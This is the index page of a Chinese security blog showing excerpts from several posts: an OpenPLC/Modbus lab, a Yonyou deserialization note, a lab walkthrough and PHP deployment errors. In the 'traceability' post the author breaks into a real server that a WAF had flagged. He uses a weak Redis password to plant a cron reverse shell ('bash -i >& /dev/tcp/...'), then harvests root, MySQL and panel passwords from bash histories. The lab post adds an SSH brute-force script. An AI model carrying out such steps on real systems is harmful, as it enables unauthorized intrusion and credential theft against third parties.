<!DOCTYPE html>
<html>

    <head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="本站由哨兵安全实验室支持创办">

<link rel="shortcut icon" href="/assets/img/favicon.png">
<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="©「哨兵」| Sentry Security" />



<!-- Open Graph metadata -->
<meta property="og:type" content="website" />
<meta property="og:title" content="哨兵安全博客 | ©「哨兵」| Sentry Security" />
<meta property="og:description" content="本站由哨兵安全实验室支持创办" />
<meta property="og:image" content="http://localhost:80/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
<meta property="og:url" content="http://localhost:80/blog/" />

<title>哨兵安全博客 | ©「哨兵」| Sentry Security</title>

<!-- Bootstrap core CSS -->
<link href="/assets/css/bootstrap.css" rel="stylesheet">

<!-- Custom styles for this template -->
<link href="/assets/css/style.css" rel="stylesheet">
<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">

<script src="/assets/js/jquery.min.js"></script>
<script src="/assets/js/bootstrap.min.js"></script>
</head>


    <body>
        <!-- Fixed navbar -->
<div class="navbar navbar-default navbar-fixed-top" role="navigation">
  <div class="container">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/"><!--
   --><picture>
  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
  
  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
  </picture>
 Sentry Security</a>
    </div>
    <div class="navbar-collapse collapse navbar-right">
      <ul class="nav navbar-nav">
        <li ><a href="/">HOME</a></li>
        <li class="active"><a href="/blog/">BLOG</a></li>
        <li><a href="http://wiki.sentrylab.cn">WIKI</a></li>
        <li><a href="https://about.sentrylab.cn">ABOUT ME</a></li>
      </ul>
    </div><!--/.nav-collapse -->
  </div>
</div>


            <div class="container mtb">
  <div class="row">

    <! -- BLOG POSTS LIST -->
    <div class="col-lg-9">

      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/"><h3 class="ctitle">《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》</h3></a>
          <p><csmall>May 7, 2021. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h4 id="-wireshark流量分析"># <em>WireShark</em>流量分析</h4>

<p>网上已经有大佬上传wireshark流量文件，就不重复造轮子去流量了，直接下载下来对照poc代码分析看看：</p>

<ul>
  <li><a href="https://github.com/sxd0216/attack-packets">点击下载：<em>sxd0216/attack-packets</em></a>
    <ul>
      <li>14、16帧为client向server请求流量，具体如下图：</li>
      <li>15、17帧为server返回给client确认流量，具体流量可自行下载分析</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/img/blog/2021/wireshark_tcp_show.png" alt="" /></p>

<h4 id="-模拟攻击启停"># 模拟攻击启停</h4>

<p><img src="/assets/img/blog/2021/OpenPLC_attack_success.gif" alt="" /></p>


          <p><a href="/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/"><h3 class="ctitle">《基于Modbus协议与KingView实现Openplc仿真通讯（1）- 仿真通讯靶场搭建》</h3></a>
          <p><csmall>May 7, 2021. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>基于Modbus协议与KingView实现Openplc仿真通讯 - 通讯靶场网络示意图如下</li>
</ul>

<p><img src="/assets/img/blog/2021//assets-network-show.png" alt="assets-network-show.png" /></p>

<h4 id="-openplc-on-linux"># <em>OpenPLC on Linux</em></h4>

<ul>
  <li><em>OpenPLC</em>环境搭建
    <ul>
      <li><a href="https://github.com/thiagoralves/OpenPLC_v3"><em>点击以了解OpenPLC</em></a></li>
    </ul>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir ICWR &amp;&amp; cd ICWR
$ git clone https://github.com/thiagoralves/OpenPLC_v3.git
$ cd OpenPLC_v3
$ ./install.sh linux
···
···
···
Compiling for Linux
Generating object files...
Generating glueVars...
Compiling main program...
Compilation finished successfully!
</code></pre></div></div>

<p>运行：<code class="language-plaintext highlighter-rouge">nohup ./start_openplc.sh &amp;</code></p>

<ul>
  <li><em>OpenPLC_Editor on Linux</em></li>
</ul>

<p><strong>作用为本地PLC程序调试使用，无需求可跳过</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ git clone https://github.com/thiagoralves/OpenPLC_Editor.git
$ cd OpenPLC_Editor
$ ./install.sh
$ ./openplc_editor.sh
</code></pre></div></div>

<h4 id="-openplc-programs"># <em>OpenPLC Programs</em></h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -o openplc_test.st https://raw.githubusercontent.com/sxd0216/openplc_test.st/master/openplc_test.st
</code></pre></div></div>

<p><img src="/assets/img/blog/2021/OpenPLC_TODO1.png" alt="" /></p>

<h4 id="-kingview-on-windows"># <em>Kingview on Windows</em></h4>

<ul>
  <li>设备驱动 -&gt; PLC -&gt; 莫迪康 -&gt; ModBUS TCP -&gt; TCP -&gt; 下一步：</li>
</ul>

<p><img src="/assets/img/blog/2021/KingView_OPENPLC_TODO.png" alt="KingView_OPENPLC_TODO" /></p>

<ul>
  <li>
    <p>文件 -&gt; 画面 添加组件（可参考动图添加组件）</p>
  </li>
  <li>
    <p>数据库 -&gt; 数据字典 -&gt; 新建…</p>
    <ul>
      <li><img src="/assets/img/blog/2021/KingView_OPENPLC_TODO2.png" alt="" /></li>
    </ul>
  </li>
</ul>

<p>选中自定义画面 -&gt; make -&gt; view （GIF动画有点大，loading…）：</p>

<p><img src="/assets/img/blog/2021/KingView_OPENPLC_success.gif" alt="success.gif" /></p>

          <p><a href="/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2021/yonyou-nc6.5-java-underser/"><h3 class="ctitle">[UPDATING...]用友NC6.5java反序列化</h3></a>
          <p><csmall>Mar 13, 2021. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="零用友nc65反序列化依赖jar包">零：用友nc6.5反序列化依赖jar包</h2>

<ul>
  <li>部分依赖jar包在安装完nc6.5系统后，一般在<code class="language-plaintext highlighter-rouge">C://yonyou//home//lib//</code>目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：
    <ul>
      <li><em><a href="https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD">点击以了解yonyou-nc6.5-lib</a></em>
        <ul>
          <li>本机运行环境</li>
        </ul>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  java version "1.8.0_181"
  Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
  Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)

  javac 1.8.0_181
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>学习教程<a href="https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD"><em>README</em></a></li>
</ul>

<h3 id="0x01下载">0x01：下载</h3>

<ul>
  <li>单jar包：点击<a href="https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/ncdepend.jar"><em>ncdepend.jar</em></a>链接 -&gt; Download.</li>
  <li>整包<a href="https://github.com/Bin4xin/bigger-than-bigger/releases/tag/yonyou-ncv6.5"><em>yonyou-NCv6.5-lib.zip</em></a>链接 -&gt; 单击链接下载</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[anonymous] DEBUG  - Invoke nc.bs.framework.server.RemoteMetaContext.lookup write info to server spend time: 188 
Exception in thread "main" nc.bs.framework.exception.FrameworkIOException: Remote request error
</code></pre></div></div>


          <p><a href="/blog/2021/yonyou-nc6.5-java-underser/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/"><h3 class="ctitle">CST 2021年 4月14日 星期三：一次朔源事件的记录</h3></a>
          <p><csmall>Mar 13, 2021. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h3><em>《Bin4xin：我的网安从业朔源事件记录》</em></h3>

<h3 id="零起源">零：起源</h3>

<ul>
  <li>
    <p><em>一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声</em></p>

    <ul>
      <li>
        <p>甲方：小伙伴们接集团要求需对 <em>WAF全流量平台</em> 攻击ip进行朔源…</p>

        <ul>
          <li>废佬：这…（甲方你真可爱）</li>
        </ul>
      </li>
      <li>
        <p>领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，
  落实外部可借力工具和资源，<a href="https://www.github.com/Bin4xin" target="_blank">[@Bin4xin废佬]</a>也加入此次探索学习中。</p>

        <ul>
          <li>废佬：这…（领导你真可爱）</li>
        </ul>
      </li>
      <li>
        <p>领导2：<em>文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》</em></p>
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv    
223.214.211.46
36.59.38.115
        
$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
16570
</code></pre></div>        </div>
        <ul>
          <li>废佬：这…（领导你真可爱）</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
    <p>于是废佬就开始了愉快 <em>boring</em> 的朔源之旅</p>
  </li>
</ul>

<h3 id="一上午欢乐时光--fofa安全工程师">一：上午、欢乐时光 &amp; fofa安全工程师</h3>

<blockquote>
  <p>鲁迅：</p>

  <p>不会朔源的fofa安全工程师不是一个好的信息安全工程师</p>
</blockquote>

<h4 id="-1x01awksplit--linux"># 1x01：awk、split &amp; linux</h4>

<ul>
  <li>步入主题之前，先对这些文件进行一些简单的操作：
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ split -l 300 全流量、WAF4月8日-4月12日攻击IP\(1\).csv ips_preview_by300_
  $ cat ips_preview_by300_aa|wc -l                     
     300
  $ ll
    total 1400
    drwxr-xr-x  59 bin4xin  staff    1888  4 14 20:48 ./
    drwxr-xr-x+ 43 bin4xin  staff    1376  4 14 20:45 ../
    -rw-r--r--   1 bin4xin  staff    4548  4 14 20:48 ips_preview_by300_aa
    -rw-r--r--   1 bin4xin  staff    4457  4 14 20:48 ips_preview_by300_ab
    -rw-r--r--   1 bin4xin  staff    4481  4 14 20:48 ips_preview_by300_ac
    ··· 
</code></pre></div>    </div>
    <p>这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。</p>
  </li>
  <li>
    <p>just fofa：</p>

    <p><img src="/assets/img/blog/2021/emergency-response-and-traceability-by-fofa.png" alt="" /></p>
  </li>
</ul>

<h4 id="-1x02something-interesting"># 1x02：Something Interesting</h4>

<ul>
  <li><em>点击以了解 <a href="https://fofa.so/" target="_blank">fofa安全工程师们</a> 与 <a href="https://x.threatbook.cn/" target="_blank">微步安全工程师们</a></em></li>
</ul>

<p><img align="left" src="https://x.threatbook.cn/public/img/logo-in-header.882f692c.png" height="30%" width="50%" />
<img align="right" src="https://fofa.so/_nuxt/img/logo.d9ee5c4.png" height="30%" width="50%" /></p>

<p>欢乐而又短暂的上午如白驹过隙，一晃而过。</p>

<hr />

<h3 id="二下午枯燥时光--渗透测试工程师">二：下午、枯燥时光 &amp; 渗透测试工程师</h3>

<h4 id="-2x01nmapnc--linux-shell"># 2x01：nmap、nc &amp; linux shell</h4>

<p>终于：发现了一些有趣的：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE  SERVICE         VERSION
22/tcp   open   ssh             OpenSSH 6.6.1 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5 (RSA)
|   256 9d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4 (ECDSA)
|_  256 7b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1 (ED25519)
80/tcp   open   http            nginx
| http-ls: Volume /
| SIZE  TIME               FILENAME
| -     24-Feb-2021 13:21  admin/
| -     24-Feb-2021 09:27  redis/
| -     24-Aug-2017 04:55  staragent/
| -     24-Feb-2021 08:44  www/
| -     24-Feb-2021 08:44  www/htdocs/
| -     13-Apr-2021 19:44  www/logs/
|_
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Index of /
888/tcp  open   http            nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 404 Not Found
3306/tcp open   mysql           MySQL 5.5.62-log
6379/tcp open   redis           Redis key-value store
8080/tcp open   http            Apache Tomcat 8.5.63
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.63
8888/tcp open   http            Ajenti http control panel
</code></pre></div></div>

<ul>
  <li>事实上：这是一个宝塔面板，<code class="language-plaintext highlighter-rouge">8888+888</code>端口；</li>
  <li>另一个事实是：这个被WAF报成<code class="language-plaintext highlighter-rouge">4月8日-4月12日攻击IP</code>的IP， <em>mysql &amp; redis</em> 均为弱口令。
    <ul>
      <li><em><a href="https://xz.aliyun.com/t/8018#toc-8" target="_blank">点击更多以了解redis渗透</a></em></li>
    </ul>
  </li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./redis-cli -h redis_target_ip           
redis_target_ip:6379&gt; get key
(error) NOAUTH Authentication required.
redis_target_ip:6379&gt; 
redis_target_ip:6379&gt; auth 123456
OK
redis_target_ip:6379&gt; get key
(nil)
redis_target_ip:6379&gt; set  xx   "\n* * * * * bash -i &gt;&amp; /dev/tcp/your_vps_target/port 0&gt;&amp;1\n"
OK
redis_target_ip:6379&gt; config set dir /var/spool/cron/
OK
redis_target_ip:6379&gt; config set dbfilename root
OK
redis_target_ip:6379&gt; save
OK
redis_target_ip:6379&gt; quit
</code></pre></div></div>

<h4 id="-2x02bashinformation-gathering--traceability-incident"># 2x02：bash、Information gathering &amp; Traceability incident</h4>

<p>于是我们通过上面步骤获得了服务器权限；<em>awesome ? next more awesome.</em></p>

<p>通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；</p>

<p><em><strong>NO OFFENCE:-)Thanks</strong></em></p>

<ul>
  <li>更加了解linux和linux面板，否则就会显得十分业余，不管你是Development, operation and maintenance or security practitioners；
    <ul>
      <li>匮乏的linux知识导致的过多ssh连接：
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ps -ef|grep ssh|wc -l
  50
</code></pre></div>        </div>
      </li>
      <li>错乱的终端与数据库命令运行：
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ cat /home/admin/.bash_history 
  sudo grep wordpress_admin_passwd /root/env.txt
  /usr/local/mysql/bin/mysql -u root -p123456
  sudo su rooe
  sudo su root
  sudo grep mysql_root_passwd /root/env.txt
  mysql
  alias mysql=/usr/local/mysql/bin/mysql
  mysql
  find / -name mysql.sock
  sudo grep mysql_root_passwd /root/env.txt
  msyql
  sudo su root
  grant all privileges on *.* to 'root'@'%' identified by 'pass-hidden';
  grant all privileges on *.* to 'root'@'%' identified by '123456';
</code></pre></div>        </div>
      </li>
      <li>错误的linux权限分配：
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ ps -ef|grep root
  root      7963     1  0 Mar06 ?        00:39:39 /usr/bin/java -Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar -Dcatalina.base=/www/server/apache-tomcat-8.5.63 -Dcatalina.home=/www/server/apache-tomcat-8.5.63 -Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temp org.apache.catalina.startup.Bootstrap start
  root     23017     1  0 Mar06 ?        00:00:00 nginx: master process nginx -c conf/nginx.conf
  root     27803     1  0 Feb25 ?        01:17:18 ./redis-server *:6379
  ···
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>同样的：通过history找到面板管理密码；
    <ul>
      <li>tools.py form BT panel：
        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $ cat /root/.bash_history |grep tools
  cd /www/server/panel &amp;&amp; python tools.py panel pass-hidden
  $ cat /www/server/panel/tools.py
        
  if __name__ == "__main__":
      type = sys.argv[1]
      if type == 'root':
          set_mysql_root(sys.argv[2])
      elif type == 'panel':
          set_panel_pwd(sys.argv[2])
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<p>所以，panel模式下对应的是面板密码设置；</p>

<p><img src="/assets/img/blog/2021/stupid-bt-panel-control-pic.png" alt="" />
至此，我们获得了 <em>root、redis、mysql、BT panel</em> ；而本文并炫技，我们的初衷是朔源：</p>

<ul>
  <li><em>mysql</em>：数据库仅仅是存放论坛系统管理的信息及测试信息；</li>
  <li><em>redis</em>：配合 <em>mysql</em>，不必多说；</li>
  <li><em>BT panel：www、ftp、sql</em> 等配置均为简单配置，没有参考价值。</li>
</ul>

<h3 id="三总结">三：总结</h3>

<ul>
  <li>1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；</li>
  <li>2、结合 <em># 2x01 及 # 2x02</em> 小结通篇结束并未发现攻击迹象、痕迹；</li>
  <li>3、为何被报为攻击IP不得而知。</li>
</ul>

<h3 id="四申明">四：申明</h3>

<p>作者：Bin4xin</p>

<p>转载请申明本文链接：<a href="/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/" target="_blank">《Bin4xin：我的网安从业朔源事件记录》</a></p>

<p>以上。</p>

          <p><a href="/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2021/thereis-something2say/"><h3 class="ctitle">辛丑·本命年 年后的一些思考</h3></a>
          <p><csmall>Mar 13, 2021. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：</p>

<ul>
  <li>一切正在有条不紊的进行着：</li>
</ul>

<p>按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在20年靠着这个为公司护网“打下了一片江山”，今年应进一步理解；</p>

<p><strong>说些没用的：</strong></p>

<p>过年回来后，忙里偷闲与学校网安实验室的孩子们开了一次线下交流会，交流会的主要内容就是总结寒假以来的学习过程和心得汇报；因为年纪较小，基本都是刚大一、大二，所以偶尔也要进行大学生活困扰的解惑；</p>

<ul>
  <li>网安实验室队伍安排：
    <ul>
      <li>导师：
  队伍灵魂；</li>
      <li>我的角色：
  我想，我在这个队伍里扮演的角色应该是作为行业“过来人”对他们的学习计划进行有效的监督和建议。</li>
      <li>攻击队伍（红队）要求：
        <ul>
          <li>1.熟悉各种漏洞特征和利用原理；</li>
          <li>2.能够基本读懂POC代码所进行的操作，并自己有一定的编程能力和代码审计能力；</li>
          <li>3.熟悉市面主流WAF的识别、WAF规则探测、绕过以及攻击WAF后的资产。</li>
        </ul>
      </li>
      <li>防守队伍（蓝队）要求：
        <ul>
          <li>1.熟悉各类漏洞形成原因、及时跟进互联网上爆出的各种0day、1day、Nday，并对频繁爆出漏洞的组件有深刻的理解，如WebLogic反序列化、Shiro反序列化、各种（SQL、模版）注入等等；</li>
          <li>2.熟悉主流操作系统Linux、Windows的工作原理如软件编译安装能力、集群的独立运维能力以及安全事件朔源能力；</li>
          <li>3.能够做到独立部署安全（审计）平台或安全工具，如WAF以及WAF工作涉及的规则库编写。</li>
        </ul>
      </li>
      <li>数据挖掘类，涉及到算法应用等；不多说。</li>
      <li>开发类；不多说。</li>
    </ul>
  </li>
</ul>

<hr />

<ul>
  <li>现存问题如下：</li>
</ul>

<p>如何在现阶段的网安环境下，打造出一支专业化团队：<br />
    |__ 1、网安实验室是否能够成立CTF战队？<br />
    |__ 2、企业安全专业化安全服务团队？<br /></p>

<ul>
  <li>问题1、针对夺旗战队，我想：当下的拥有的资源便是最好的机会：
    <ul>
      <li>能够有本专业导师的指导同时，有一定生源来进行夺旗比赛
        <ul>
          <li>选取队长来保证战队的凝聚力和团队活力；</li>
          <li>管理团队应当采取比赛军事化管理；包括晨跑、内部攻防训练赛</li>
        </ul>
      </li>
      <li>生源的匹配问题：
        <ul>
          <li>在生源筛选时存在的问题：
            <ul>
              <li>或许在实验室的生源选择中，应当让所有有该行业兴趣的新生都加入进来，我始终相信的是，大学生活是自身兴趣的发掘过程，对他们的培养过程同时也是考核过程；</li>
              <li>因为当下存在的问题较为明显。</li>
            </ul>
          </li>
          <li>部分年轻新生，无法在团队的带跑下跟上节奏，踢出；</li>
          <li>小部分自身问题产生各种问题</li>
        </ul>
      </li>
    </ul>
  </li>
</ul>


          <p><a href="/blog/2021/thereis-something2say/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/GainPower/walkthrough/"><h3 class="ctitle">GainPower靶场渗透历程</h3></a>
          <p><csmall>Dec 2, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <ul>
  <li>employee1:ssh banner发现问题；
    <ul>
      <li>根据提示获得低权限shell</li>
    </ul>
  </li>
  <li>employee64:考验脚本编写能力（ssh爆破）
    <ul>
      <li>bash脚本批量连接</li>
    </ul>
  </li>
  <li>programmer:获取sudo shell
    <ul>
      <li>通过unshare切换到sudo用户</li>
      <li><code class="language-plaintext highlighter-rouge">$ su - employee64</code></li>
      <li><code class="language-plaintext highlighter-rouge">$ sudo -u programmer unshare</code></li>
    </ul>
  </li>
  <li>vanshal:crontab计划获取shell
    <ul>
      <li>pspy tool to detected</li>
      <li>/media/programmer/scripts/backup.sh</li>
    </ul>
  </li>
  <li>root:secert zip file
    <ul>
      <li>zip password crack</li>
      <li>login ajenti to run root shell.</li>
    </ul>
  </li>
</ul>

<p>写个脚本来批量跑试试看：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash

pwn () {
  read -p 'target ip: ' ip
  sleep 2
  for data in {1..100}
  do
      echo 'Try: ' $data
      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
      printf "\n"
  done
}

pwn
</code></pre></div></div>
<p>for一下用户名密码{employee+$data}in{1..100}，使用sshpass进行批量ssh连接认证，并尝试<code class="language-plaintext highlighter-rouge">sudo</code>;
失败如下：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[sudo] employee100 的密码：对不起，用户 employee100 不能在 localhost 上运行 sudo。
</code></pre></div></div>
<p>成功：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[sudo] employee64 的密码：匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 employee64 可以在 localhost 上运行以下命令：
    (programmer) /usr/bin/unshare
</code></pre></div></div>
<p>所以用户employee64是拥有sudo权限；</p>


          <p><a href="/blog/GainPower/walkthrough/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2020/php-depoly/"><h3 class="ctitle">PHP:部署的一揽子问题</h3></a>
          <p><csmall>Nov 25, 2020. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Wed Nov 25 17:19:33.475439 2020] <span class="o">[</span>php7:notice] <span class="o">[</span>pid 11872] <span class="o">[</span>client 10.211.55.2:53568] PHP Notice:  Undefined index: step <span class="k">in</span> /var/www/
html/code/BabyOnline1/setup/setupwizard.php on line 4 <span class="o">[</span>Wed Nov 25 17:19:33.475577 2020] <span class="o">[</span>php7:error] <span class="o">[</span>pid 11872] <span class="o">[</span>client 10.211.55.2:53568] 
PHP Fatal error:  Uncaught Error: Class <span class="s1">'DOMDocument'</span> not found <span class="k">in</span> /var/www/html/code/BabyOnline1/setup/setupwizard.php:46<span class="se">\n</span>
Stack trace:<span class="se">\n</span><span class="c">#0 {main}\n  thrown in /var/www/html/code/BabyOnline1/setup/setupwizard.php on line 46</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Wed Nov 25 17:21:46.224793 2020] [php7:error] [pid 11882] [client 10.211.55.2:53602] PHP Fatal error:  Uncaught Error: 
Call to undefined function mysqli_connect() in 

/var/www/html/code/BabyOnline1/utility/mysqli5.php:39\nStack trace:\n#0 /var/www/html/code/BabyOnline1/utility/fun.class.php(281): 
Conn-&gt;__construct('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8', true)\n#1 /var/www/html/code/BabyOnline1/utility/fun.class.php
(255): Utility-&gt;CreateDBConnect('localhost', '3306', 'root', 'tsinglink', 'qx_bbol', 'UTF8')\n#2 /var/www/html/code/BabyOnline1/platform/php/
ini.php(41): Utility-&gt;__construct()\n#3 /var/www/html/code/BabyOnline1/platform/php/plat_manage.php(5): require_once('/var/www/html/c...')
\n#4 {main}\n  thrown in /var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39, referer: http://10.211.55.4/platform/
</code></pre></div></div>
<p>提示在<code class="language-plaintext highlighter-rouge">/var/www/html/code/BabyOnline1/utility/fun.class.php(281)</code>文件、
<code class="language-plaintext highlighter-rouge">/var/www/html/code/BabyOnline1/platform/php/ini.php(41)</code>文件
<code class="language-plaintext highlighter-rouge">/var/www/html/code/BabyOnline1/utility/mysqli5.php on line 39</code>文件</p>

<p>第一个fun.class.php文件是实现的日志写入数据库的功能；</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function WriterToDB($typeid,$clientAddress,$datetime,$file,$line,$function,$content)
	{
		global $utility;
		if(is_array($content))
		{
			$conn = $utility-&gt;CreateDBConnect($_SESSION["DB"]["Host"],$_SESSION["DB"]["Port"],$_SESSION["DB"]["User"],$_SESSION["DB"]["Password"],$_SESSION["DB"]["Name"],$_SESSION["DB"]["Character"]);
			$conn-&gt;Query("INSERT INTO `NMIOperationLog` (`Index`,`Operation`,`OperationTime`,`Description`,`ManageDomainUserInfo_Index`,`ManageDomain_Index`,`ManageDomainUserInfo_Identity`,`ManageDomains`,`SqlScript`)VALUES(null,'".$content["Operation"]."','".$content["OperationTime"]."','".addslashes($content["Description"])."','".$content["ManageDomainUserInfo_Index"]."','".$content["ManageDomain_Index"]."','".$content["ManageDomainUserInfo_Identity"]."','".$content["ManageDomains"]."','".addslashes($content["SqlScript"])."') ");
	
			//$log-&gt;Writer(1,"NMI",strftime("%Y-%m-%d %H:%M:%S",time()),__FILE__,__LINE__,__FUNCTION__,mysql_error());
			
		}
		return true;
	}
</code></pre></div></div>
<p>连库WriterToDB实现功能如上；同样的<code class="language-plaintext highlighter-rouge">ini.php</code>同样定义了数据库的配置信息包括类型、url和连接信息：</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>define('LOGSAVETYPE',1);
define('LOGLEVEL',1);

